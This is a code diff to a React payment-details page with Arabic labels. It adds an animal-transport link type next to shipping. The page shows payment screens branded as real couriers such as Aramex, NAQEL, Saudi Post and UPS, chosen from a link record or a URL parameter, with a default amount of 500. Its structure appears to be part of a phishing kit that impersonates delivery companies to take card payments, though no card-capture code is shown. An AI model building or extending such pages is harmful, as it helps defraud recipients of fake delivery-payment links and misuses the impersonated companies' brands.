@@ -2,13 +2,14 @@ import { useParams, useNavigate } from "react-router-dom";
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getAnimalServiceBranding } from "@/lib/animalServiceLogos";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, PawPrint, MapPin } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -16,9 +17,10 @@ const PaymentDetails = () => {
   const { data: linkData } = useLink(id);
   const [logoError, setLogoError] = useState(false);
 
+  const linkType = linkData?.type || 'shipping';
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = linkType === 'animal' ? getAnimalServiceBranding(serviceKey) : getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
 
   const getLayout = () => {
@@ -46,8 +48,8 @@ const PaymentDetails = () => {
   // Get currency info for display
   const currencyInfo = getCurrencyByCountry(countryCode);
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
+  // Get amount from link data - handle both shipping and animal transport
+  const rawAmount = shippingInfo?.cod_amount || shippingInfo?.transport_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -112,29 +114,57 @@ const PaymentDetails = () => {
             className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
             style={{ color: branding.colors.primary }}
           >
-            تفاصيل الشحنة
+            {linkType === 'animal' ? 'تفاصيل النقل' : 'تفاصيل الشحنة'}
           </h3>
           <div className="space-y-2 text-xs sm:text-sm">
-            {shippingInfo.tracking_number && (
-              <div className="flex items-center gap-2">
-                <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
-                <span className="text-muted-foreground text-xs sm:text-sm">رقم الشحنة:</span>
-                <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.tracking_number}</span>
-              </div>
-            )}
-            {shippingInfo.package_description && (
-              <div className="flex items-center gap-2">
-                <Truck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
-                <span className="text-muted-foreground text-xs sm:text-sm">وصف الطرد:</span>
-                <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.package_description}</span>
-              </div>
-            )}
-            {shippingInfo.cod_amount > 0 && (
-              <div className="flex items-center gap-2">
-                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
-                <span className="text-muted-foreground text-xs sm:text-sm">مبلغ COD:</span>
-                <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
-              </div>
+            {linkType === 'animal' ? (
+              <>
+                {shippingInfo.animal_type && (
+                  <div className="flex items-center gap-2">
+                    <PawPrint className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                    <span className="text-muted-foreground text-xs sm:text-sm">نوع الحيوان:</span>
+                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.animal_type}</span>
+                  </div>
+                )}
+                {shippingInfo.animal_details && (
+                  <div className="flex items-start gap-2">
+                    <Package className="w-3 h-3 sm:w-4 sm:h-4 mt-0.5" style={{ color: branding.colors.secondary }} />
+                    <span className="text-muted-foreground text-xs sm:text-sm">التفاصيل:</span>
+                    <span className="font-semibold text-xs sm:text-sm flex-1" style={{ color: branding.colors.text }}>{shippingInfo.animal_details}</span>
+                  </div>
+                )}
+                {shippingInfo.destination && (
+                  <div className="flex items-center gap-2">
+                    <MapPin className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                    <span className="text-muted-foreground text-xs sm:text-sm">الوجهة:</span>
+                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.destination}</span>
+                  </div>
+                )}
+              </>
+            ) : (
+              <>
+                {shippingInfo.tracking_number && (
+                  <div className="flex items-center gap-2">
+                    <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                    <span className="text-muted-foreground text-xs sm:text-sm">رقم الشحنة:</span>
+                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.tracking_number}</span>
+                  </div>
+                )}
+                {shippingInfo.package_description && (
+                  <div className="flex items-center gap-2">
+                    <Truck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                    <span className="text-muted-foreground text-xs sm:text-sm">وصف الطرد:</span>
+                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{shippingInfo.package_description}</span>
+                  </div>
+                )}
+                {shippingInfo.cod_amount > 0 && (
+                  <div className="flex items-center gap-2">
+                    <DollarSign className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.secondary }} />
+                    <span className="text-muted-foreground text-xs sm:text-sm">مبلغ COD:</span>
+                    <span className="font-semibold text-xs sm:text-sm" style={{ color: branding.colors.text }}>{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
+                  </div>
+                )}
+              </>
             )}
           </div>
         </div>
